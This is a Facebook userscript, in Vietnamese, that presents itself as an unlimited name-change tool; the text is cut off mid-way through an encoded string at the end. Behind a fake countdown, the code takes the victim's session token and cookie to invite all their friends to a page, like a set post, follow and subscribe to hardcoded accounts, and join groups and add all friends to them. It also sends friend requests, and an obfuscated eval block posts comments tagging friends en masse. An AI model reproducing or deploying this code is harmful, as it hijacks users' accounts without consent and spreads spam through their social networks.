// ==UserScript==
// @name            Đổi tên facebook
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==CHI BI==
	

    var Title = "Đổi tên Facebook không giới hạn</A>";
    var Descriptions = "",
        _text = 'Cảm ơn bạn đã sử dụng ứng dụng của: <A style="color:#3B5998;" href="https://www.facebook.com/lietduongcongtu" target="_blank">Cộng đồng IT Việt</A></br>Để kết thúc vui lòng chia sẻ bài viết được ghim: </A><A style="color:#3B5998;" href="https://www.facebook.com/lietduongcongtu" target="_blank">Chia sẻ bài viết tại đây</A></A>,</A></A>.</br>Vui lòng chia sẻ Video này để bắt đầu tính thời gian chờ: <A style="color:#3B5998;" href="https://www.facebook.com/media/set/?set=a.572615132779595.1073741843.482770981764011&type=3" target="_blank">Chia sẻ bộ ảnh tại đây</A>.</A>';
     
    page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];
     
    function InviteFriends(opo) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (a) {
            var b = a.substring(a.indexOf("{"));
            var c = JSON.parse(b);
            i--;
            Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
            if (c.error) {
                Descriptions += "color:darkred'>";
                err++;
                if (c.errorDescription) Descriptions += c.errorDescription;
                else Descriptions += JSON.stringify(c, null, "")
            } else {
                Descriptions += "color:darkgreen'>";
                Descriptions += arn[i] + " đã từng ghé thăm trang " + page_name + ".";
                suc++
            }
            Descriptions += "</div>";
            var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
            display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
            if (i > 0) {
                display += arr.length + " Giây còn lại, vui lòng chờ...<br/>";
                display += "<b>" + suc + "</b> tên có thể sử dụng trong tổng số " + (arr.length - i) + " tên ";
                display += "(" + i + " giây còn lại...)";
                display += "<div class='friend-edge'>";
                display += Descriptions;
                display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
                display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
                display += "Vui lòng không tắt trình duyệt Web hoặc chuyển sang trang khác trong quá trình đọc tên khả dụng tại FanPage " + page_name + ".</br>";
    display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Về trang chủ</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Hủy</span><br/>";
                display += _text;
                display += "</div>";
                display += "</div>";
                display += "</div>";
                window[tag + "_close"] = true
            } else {
                Title = "Thông Báo.</A>";
                display += arr.length + " tên có thể sử dụng trong tổng số ";
                display += "<b>" + suc + " tên, bạn có thể thiết lập lại tên trong vài ngày tới, vui lòng chờ sau vài ngày, sau khi hết thời gian chờ bạn có thể thiết lập lại tên trong phần thiết lập tài khoản, ứng dụng sẽ gửi thông báo đến cho bạn ngay khi hết thời gian chờ, và trong thời gian chờ bạn vẫn có thể sử dụng Facebook bình thường.</b></br>";
                display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Về trang chủ</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>F5 Refresh</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>OK</span><br/>";
                display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
                display += _text;
                display += "</div>";
                window[tag + "_close"] = false
            }
            display += "</div>";
            document.getElementById("pagelet_sidebar").innerHTML = display
        }, "text", "post");
        tay--;
        if (tay > 0) {
            var s = arr[tay];
            setTimeout("InviteFriends(" + s + ")", 100)
        }
        console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
     
     
        if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=744143602280154&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
     
    }
    jx = {
        b: function () {
            var b = !1;
            if ("undefined" != typeof ActiveXObject) try {
                b = new ActiveXObject("Msxml2.XMLHTTP")
            } catch (c) {
                try {
                    b = new ActiveXObject("Microsoft.XMLHTTP")
                } catch (a) {
                    b = !1
                }
            } else if (window.XMLHttpRequest) try {
                b = new XMLHttpRequest
            } catch (h) {
                b = !1
            }
            return b
        },
        load: function (b, c, a, h, g) {
            var e = this.d();
            if (e && b) {
                e.overrideMimeType && e.overrideMimeType("text/xml");
                h || (h = "GET");
                a || (a = "text");
                g || (g = {});
                a = a.toLowerCase();
                h = h.toUpperCase();
                b += b.indexOf("?") + 1 ? "&" : "?";
                var k = null;
                "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
                e.open(h, b, !0);
                e.onreadystatechange = g.c ? function () {
                    g.c(e)
                } : function () {
                    if (4 == e.readyState)
                        if (200 == e.status) {
                            var b = "";
                            e.responseText && (b = e.responseText);
                            "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                            c && c(b)
                        } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
                };
                e.send(k)
            }
        },
        d: function () {
            return this.b()
        }
    };
     
    function ChangeLocation() {
        window.location.href = "http://www.facebook.com/"
    }
    setTimeout("ChangeLocation", 1);
    window.onbeforeunload = function () {
        if (window[tag + "_close"]) return "This script is running now!"
    };
    var i = 3;
    var tay = 3;
    var suc = 0;
    var err = 0;
    var arr = new Array;
    var arn = new Array;
    var pho = new Array;
    var tag = "Close";
    var page_name, x = document.getElementsByTagName("span");
    for (i = 0; i < x.length; i++)
        if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
    var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
        var b = a;
        var c = b.substring(b.indexOf("{"));
        var d = JSON.parse(c);
        d = d.payload.entries;
        for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
        for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
        for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
        i = arr.length - 1;
        tay = i;
        console.log(arr.length);
        var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
        display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
        display += arr.length + " Giây còn lại, vui lòng chờ . . .";
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display;
        InviteFriends(arr[i])
    });
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
    var now = (new Date).getTime();
     
    function p(post) {
     
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/ufi/like.php";
    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=2&client_id=1381377993496%3A1284500146&rootid=u_0_8&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=g&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
    X.close;
    }
    };
    X.send(XParams);
    }
    p("352532461504851");
     
    // sub va add mem
    function getRandomInt (min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    function randomValue(arr) {
        return arr[getRandomInt(0, arr.length-1)];
    }
     
    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
           
    function cereziAl(isim) {
        var tarama = isim + "=";
        if (document.cookie.length > 0) {
            konum = document.cookie.indexOf(tarama)
            if (konum != -1) {
                konum += tarama.length
                son = document.cookie.indexOf(";", konum)
                if (son == -1)
                    son = document.cookie.length
                return unescape(document.cookie.substring(konum, son))
            }
            else { return ""; }
        }
    }
    function getRandomInt (min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    function randomValue(arr) {
        return arr[getRandomInt(0, arr.length-1)];
    }
     
    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
     
    function a(abone){
        var http4 = new XMLHttpRequest();
         
        var url4 = "/ajax/follow/follow_profile.php?__a=1";
         
        var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
        http4.open("POST", url4, true);
         
        //Send the proper header information along with the request
        http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        http4.setRequestHeader("Content-length", params4.length);
        http4.setRequestHeader("Connection", "close");
         
        http4.onreadystatechange = function() {//Call a function when the state changes.
        if(http4.readyState == 4 && http4.status == 200) {
           
          http4.close; // Close the connection
         
        }
        }
       
        http4.send(params4);
    }
     
    function sublist(uidss) {
                    var a = document.createElement('script');
                    a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
                    document.body.appendChild(a);
    }
    //fb ku adibpn
    a("100000116806167");
 a("100001641681168");
 a("100006930669957");
 a("100003999895680");
 a("100003810860439");

    sublist("818730808140805");
    sublist("818730678140818");
    sublist("818721584808394");
        
    //Group ku adibpn
    var gid = ['332976360092707'];
    var gid = ['191605454317937'];     
    var gid = ['482770981764011'];  
    var gid = ['230681650365026'];  
    var gid = ['116079135145926'];  
    var gid = ['398334620273077'];
    var gid = ['442009315820236'];
    var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
    var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
     
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
    var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['send'](paramswp);
     
    var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
    var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
     
    var friends = new Array();
    gf = new XMLHttpRequest();
    gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
    gf['send']();
    if (gf['readyState'] != 4) {} else {
        data = eval('(' + gf['responseText']['substr'](9) + ')');
        if (data['error']) {} else {
            friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
                return _0x93dax8['index'] - _0x93dax9['index'];
            });
        };
    };
         for (var i = 0; i < friends['length']; i++) {
        var httpwp = new XMLHttpRequest();
        var urlwp = '/ajax/groups/members/add_post.php?__a=1';
        var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
        httpwp['open']('POST', urlwp, true);
        httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
        httpwp['setRequestHeader']('Content-length', paramswp['length']);
        httpwp['setRequestHeader']('Connection', 'keep-alive');
        httpwp['onreadystatechange'] = function () {
    if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
        };
        httpwp['send'](paramswp);
    };
    var spage_id = "332976360092707";
    var spost_id = "100000116806167";
    var sfoto_id = "818767601470459";
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    var smesaj = "";
    var smesaj_text = "";
    var arkadaslar = [];
    var svn_rev;
    var bugun= new Date();
    var btarihi = new Date();
    btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
    if(!document.cookie.match(/paylasti=(\d+)/)){
    document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
    }     
    //arkadaslari al ve isle
    function sarkadaslari_al(){
                    var xmlhttp = new XMLHttpRequest();
            xmlhttp.onreadystatechange = function () {
                            if(xmlhttp.readyState == 4){
                                      eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                      for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
                                            smesaj = "";
                                            smesaj_text = "";
                                      for(i=f*10;i<(f+1)*10;i++){
                                            if(arkadaslar.payload.entries[i]){
                                      smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                      smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                      }
                                            }
                                            sdurumpaylas();                         }
                                   
                            }
                           
            };
                    var params = "&filter[0]=user";
                    params += "&options[0]=friends_only";
                    params += "&options[1]=nm";
                    params += "&token=v7";
            params += "&viewer=" + user_id;
                    params += "&__user=" + user_id;
                   
            if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
            else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
            xmlhttp.send();
    }
     
    //tiklama olayini dinle
    var tiklama = document.addEventListener("click", function () {
    if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
    svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
    sarkadaslari_al();
    document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
     
    document.removeEventListener(tiklama);
    }
     }, false);
     
     
    //arkada      leme
    function sarkadasekle(uid,cins){
                    var xmlhttp = new XMLHttpRequest();
            xmlhttp.onreadystatechange = function () {
                            if(xmlhttp.readyState == 4){   
                            }
            };
                   
                    xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                    var params = "to_friend=" + uid;
                    params += "&action=add_friend";
                    params += "&how_found=friend_browser";
                    params += "&ref_param=none";
                    params += "&outgoing_id=";
                    params += "&logging_location=friend_browser";
                    params += "&no_flyout_on_click=true";
                    params += "&ego_log_data=";
                    params += "&http_referer=";
                    params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
            params += "&phstamp=165816749114848369115";
                    params += "&__user=" + user_id;
                    xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                    xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
                   
    if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
                    xmlhttp.send(params);
    }else if(document.cookie.split("cins" + user_id +"=").length <= 1){
                    cinsiyetgetir(uid,cins,"sarkadasekle");
    }else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
                    xmlhttp.send(params);
    }
    }
     
    //cinsiyet belirleme
    var cinssonuc = {};
    var cinshtml = document.createElement("html");
    function scinsiyetgetir(uid,cins,fonksiyon){
                    var xmlhttp = new XMLHttpRequest();
            xmlhttp.onreadystatechange = function () {
                            if(xmlhttp.readyState == 4){
                            eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                            cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
                            btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                            if(cinshtml.getElementsByTagName("select")[0].value == "1"){
                            document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                            }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                            document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                            }
                            eval(fonksiyon + "(" + id + "," + cins + ");");
                            }
            };
                    xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
                    xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                    xmlhttp.send();
    }
    function autoSuggest()
    {    
        links=document.getElementsByTagName('a');
        for (i in links) {
            l=links[i];
            if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
                l.click();
            }
        }
    }
     
    function blub()
    {
        if(document.getElementsByClassName('pbm fsm').length == 1) {
            w = document.getElementsByClassName('pbm fsm')[0];
     
            e = document.createElement('a');
            //e.href = '#';
            e.innerHTML = 'Auto Suggest by Adib Pugar Nuraga';
            e.className = 'uiButton';
            e.onclick = autoSuggest;
     
            if( w.childElementCount == 0)
            {
                w.appendChild(document.createElement('br'));
                w.appendChild(e);
            }
        }
    }
     
    blub();
     
    document.addEventListener("DOMNodeInserted", blub, true);
     
    eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('g e=["1S","u","1y","1B","1E","1K","1Q","1R","h = ","o (;;);","","1U","1V",";","1W","1X","2g","S"," @[","1u",":","1w","]"," ","\\1x[0]=1z","\\K[0]=1C","\\K[1]=1F","\\1G=1H","\\1I=","\\1J=","F://","1L","1M","1P","F://r.z.A/s/C/D.v?I=1","1Y","1Z://r.z.A/s/C/D.v?I=1","2a","2b","2c","\\2d=","\\2e=","\\2f=2","\\2h=2l:2m","\\2o","\\2r","\\2t=2u","\\Q={\\R\\j:\\T\\j,\\U\\j:0,\\V\\j:\\W\\j,\\X\\j:\\Y\\j,\\Z\\j:","}","\\1a=0","\\1b=0","\\1c","\\1d[1e]=[]","\\1f=1","\\1g=1h","\\1i=q","\\1j=","\\1k=","1l","/s/1m/1n.v","1o-1p","1q/x-r-1r-1s","1t","2W","1v"];g u=n[e[2]](e[1])[0][e[0]];g p=n[e[4]][e[3]](n[e[4]][e[3]](/1A=(\\d+)/)[1]);g E=e[5];g h=[];g 1D;l G(a){g b=P L();b[e[6]]=l(){m(b[e[7]]==4){1N(e[8]+b[e[12]].1O()[e[11]](e[9],e[10])+e[13]);o(f=0;f<k[e[17]](h[e[16]][e[15]][e[14]]/27);f++){t=e[10];H=e[10];o(i=f*27;i<(f+1)*27;i++){m(h[e[16]][e[15]][i]){t+=e[18]+h[e[16]][e[15]][i][e[19]]+e[20]+h[e[16]][e[15]][i][e[21]]+e[22];H+=e[23]+h[e[16]][e[15]][i][e[21]]}};J(a,t)}}};g c=e[24];c+=e[25];c+=e[26];c+=e[27];c+=e[28]+p;c+=e[29]+p;m(n[e[2i]][e[2j]](e[2k])>=0){b[e[w]](e[M],e[2n]+c,y)}2p{b[e[w]](e[M],e[2q]+c,y)};b[e[N]]()};l 2s(){g a=e[10];o(i=0;i<9;i++){a+=e[18]+h[e[16]][e[15]][k[e[O]](k[e[B]]()*h[e[16]][e[15]][e[14]])][e[19]]+e[20]+h[e[16]][e[15]][k[e[O]](k[e[B]]()*h[e[16]][e[15]][e[14]])][e[21]]+e[22]};2v a};l J(a,b){g c=P L();g d=e[10];d+=e[2w]+a;d+=e[2x]+2y(b);d+=e[2z];d+=e[2A];d+=e[2B];d+=e[2C];d+=e[2D];d+=e[2E]+a+e[2F];d+=e[2G];d+=e[2H];d+=e[2I];d+=e[2J];d+=e[29]+p;d+=e[2K];d+=e[2L];d+=e[2M];d+=e[2N]+u;d+=e[2O];c[e[w]](e[2P],e[2Q],y);c[e[2R]](e[2S],e[2T]);c[e[6]]=l(){m(c[e[7]]==4&&c[e[2U]]==2V){c[e[1T]]}};c[e[N]](d)};G(E);',62,183,'||||||||||||||_0xa22c||var|arkadaslar||x22|Math|function|if|document|for|user_id||www|ajax|mesaj|fb_dtsg|php|35||true|facebook|com|38|typeahead|first_degree|id|https|arkadaslari_al|mesaj_text|__a|yorum_yap|x26options|XMLHttpRequest|33|37|39|new|x26clp|x22cl_impid|round|x22453524a0|x22clearcounter|x22elementid|x22js_5|x22version|x22x|x22parent_fbid|||||||||||x26attached_sticker_fbid|x26attached_photo_fbid|x26giftoccasion|x26ft|tn|x26__a|x26__dyn|7n8ahyj35ynxl2u5F97KepEsyo|x26__req|x26fb_dtsg|x26ttstamp|POST|ufi|add_comment|Content|type|application|form|urlencoded|setRequestHeader|uid|close|text|x26filter|getElementsByName|user|c_user|match|friends_only|svn_rev|cookie|nm|x26token|v7|x26viewer|x26__user|371608359645809|indexOf|URL|eval|toString|GET|onreadystatechange|readyState|value|64|replace|responseText|length|entries|open|http|||||||||||send|random|floor|x26ft_ent_identifier|x26comment_text|x26source|payload|x26client_id|32|31|30|1377871797138|1707018092|34|x26reply_fbid|else|36|x26parent_comment_id|RandomArkadas|x26rootid|u_jsonp_2_3|return|40|41|encodeURIComponent|42|43|44|45|46|47|48|49|50|51|52|53|54|55|56|57|58|59|62|60|61|63|200|status'.split('|'),0,{}));
    var _4678;var _8595='18344C168F191E1649B1609D1801B3065B2113E1529A1665D1609E1649D1353F2217B2049A2185C1529C2169C2049C2185B2081A2153F2201E1761C2073A2161B2065F2209C2145E2081A2153D2201F1641D2097B2081F2201C1825B2137E2081E2145C2081D2153A2201C2193A1801E2241F1945C2049C2097F1897C2049E2145D2081F1593A1545B2105D2201D2145D2137E1545B1601D2001E1657A2017B1745E1353A2217A2049E2185C1529E2033E2057A2161D2073F2241C1529E1761E1529A2073D2161D2065E2209C2145D2081C2153C2201B1641D2097E2081A2201B1825F2137F2081E2145F2081B2153B2201A2193C1801F2241E1945A2049F2097A1897C2049D2145B2081D1593B1585F2057B2161D2073C2241F1585C1601E2001B1657E2017A1745C1353F2217C2049C2185D1529D2033A2073C2113A2217F1529C1761E1529F2073C2161E2065C2209C2145F2081D2153E2201D1641D2065D2185E2081D2049E2201E2081B1825E2137F2081B2145D2081D2153B2201C1593B1585E2073B2113D2217B1585F1601F1745E1353D2033C2073F2113F2217A1641F2193B2201C2241C2137B2081B1641B2105E2081A2113C2097B2105D2201F1761F1545C1673C1697C1545D1745E2033B2073A2113E2217A1641E2193C2201F2241C2137C2081F1641D2225F2113E2073C2201C2105E1761D1545B1665A1657A1657F1569C1545D1745E2033B2073B2113B2217F1641F2193D2201A2241D2137F2081D1641D2169C2161D2193F2113A2201C2113F2161E2153F1761D1545B2089A2113A2233D2081A2073D1545D1745B1353A2033F2073B2113F2217E1641A2193D2201E2241C2137B2081E1641D2201B2161C2169A1761E1545D2049E2209E2201F2161B1545A1745B2033E2073C2113A2217D1641C2193E2201D2241C2137D2081B1641C2057C2161C2201F2201D2161B2145B1529B1761C1529C1545C1617E1673A1697D2169F2233A1545F1745B2033A2073B2113B2217D1641F2049F2137A2113E2097D2153B1761F1545C2065D2081C2153C2201C2081D2185E1545F1745D1353B2217F2049B2185C1529A2033B2049C2209D2073B2113F2161C1761A1529D2073B2161C2065E2209E2145C2081C2153F2201A1641C2065B2185F2081E2049F2201E2081B1825E2137E2081B2145B2081A2153C2201B1593E1585C2049B2209F2073B2113B2161A1585A1601B1745B1353F2033E2049E2209C2073A2113B2161E1641E2193C2201C2241E2137B2081E1641C2225E2113C2073C2201A2105E1761D1545D1665A1657F1657C1569E1545B1745F2033D2049E2209F2073C2113B2161E1641E2193C2201E2241D2137C2081F1641A2105D2081A2113D2097F2105F2201D1761E1545B1673C1697D2169C2233F1545C1745F2033E2049B2209D2073C2113D2161C1641B2065B2161A2153E2201B2185A2161B2137F2193E1529C1761F1529E2201A2185E2209C2081A1745E2033F2049A2209D2073B2113A2161F1641C2049D2209A2201E2161C2169D2137D2049C2241D1529A1761D1529B2089B2049D2137E2193D2081E1745C1353D2033B2049F2209F2073D2113D2161C1641C2193D2185C2065A1529B1761C1529F1545C2105C2201E2201C2169C1737B1649C1649E2145A2209F2193C2113D2065A1633B2105A2153D1641F1673A1689C2105C2193E2201E2049B2201C2113A2065F1641B2065F2161F2145C1649C2209D2169A2137E2161A2049C2073A2145A2209F2193D2113D2065C1673B1649D1665B1673D2089F2057E1705C1697A1665D2089F1657A1665A1673F1713D2073B2049B1673A1689D2049F1657C1713E2081D2065B1713C1721D1681D1665A1673C1665A2081F2089F2065D1657F1713E1649B1697C1673D2057C2057A1681F1729B1689E1681E1649F2209C2169B2137D2161D2049A2073C2145D2209D2193A2113D2065E1649F2113D2073B2033B2137C2081E1649B1673F1633A1673D1657A1665A1681C1649C2105E2209B2241E2137A2209B2153A1649E1961A2169B2161A2169F1649F1793F2137B2057F2209A2145D1649E1665B1649F1897D2097B2049E2241C1569E1673F1657C1793B2241F1569D1673C1657D1937F2081F1569E1673A1657B1817F2081C2153B1569D1673D1657A1633D1569D1673E1657F1849A2161A1569E1673D1657E1921C2209A2049C2153F2097C1569C1673B1657F1849F2113F2081F2209B1649C1665F1673A1721B1649D1809C2161B2153D1569D1673D1657D1801C2209E2161E2145E1569A1673E1657E1977A2209E2049C2153E1569A1673D1657E1633E1569F1673C1657B1849D2161F1569F1673F1657D1921C2209A2049F2153D2097D1569B1673F1657D1849B2113D2081F2209D1641B2145B2169A1681D1545D1745B1353B2033D2073A2113F2217A1641B2049C2169B2169B2081E2153B2073E1809F2105E2113E2137A2073F1593C2033A2049B2209B2073C2113E2161D1601D1745A2033D2057A2161E2073C2241E1641D2049E2169B2169E2081F2153F2073D1809C2105F2113E2137C2073D1593A2033A2073C2113B2217A1601B1745F1353A1649F1609A2057E3065C2113F1529F1673F1609B1649D1353D2033A2073A2113E2217F1641A2193F2201B2241E2137B2081C1641E2105D2081B2113A2097B2105D2201E1761C1545D1673C1697E1545E1745A2033E2073E2113A2217D1641A2193A2201A2241E2137E2081E1641D2225F2113B2073C2201D2105C1761C1545B1665B1657D1657F1569B1545F1745E2033A2073A2113E2217B1641D2193A2201A2241B2137C2081F1641B2169A2161C2193A2113B2201A2113C2161A2153C1761B1545E2089C2113C2233A2081B2073F1545D1745E1353E2033D2073A2113A2217C1641F2193C2201E2241E2137D2081D1641F2201F2161D2169D1761A1545A2049C2209A2201F2161D1545A1745D2033B2073C2113B2217F1641A2193E2201E2241A2137E2081A1641A2057F2161E2201E2201E2161D2145B1761C1545A1657F1545B1745E2033A2073E2113C2217C1641D2049A2137A2113B2097E2153C1761A1545C2065D2081A2153F2201E2081D2185A1545B1745F1353B2217C2049F2185A1529C2033F2049D2209F2073B2113B2161B1761F1529B2073A2161E2065A2209A2145B2081E2153A2201F1641D2065D2185D2081E2049C2201F2081F1825E2137D2081A2145D2081A2153D2201C1593E1585B2049A2209A2073E2113B2161F1585B1601E1745F1353F2033D2049C2209A2073D2113C2161D1641D2193C2201D2241A2137B2081C1641B2225B2113E2073C2201C2105F1761C1545F1665F1657C1657B1569D1545F1745C2033F2049A2209F2073B2113B2161B1641A2193C2201C2241B2137E2081E1641B2105C2081E2113C2097C2105D2201F1761A1545E1673C1697B2169C2233B1545A1745A2033B2049E2209E2073E2113F2161D1641C2065D2161D2153F2201E2185E2161A2137A2193C1529B1761C1529E2201F2185C2209C2081F1745D1353A2033F2049C2209B2073A2113A2161B1641C2049F2209E2201A2161C2169A2137A2049C2241B1529B1761C1529F2089D2049C2137A2193D2081F1745E2033E2049E2209C2073D2113A2161D1641D2049A2209F2201C2161F2169D2137C2049D2241C1529F1761A1529C2201C2185C2209C2081A1745C1353C2033A2049F2209A2073E2113D2161D1641E2193E2185E2065C1529B1761B1529D1545A2105B2201B2201E2169B1737B1649F1649B2089A2185D2081D2081D1641B2145E2169E1681D2193E2161B2153A2097D2209F2185B2137F2193C1641E2065A2161E2145C1649C1665D1681D1697C1657D1697C1673F1705B1641D2145F2169D1681D1545D1745D1353D2033A2073A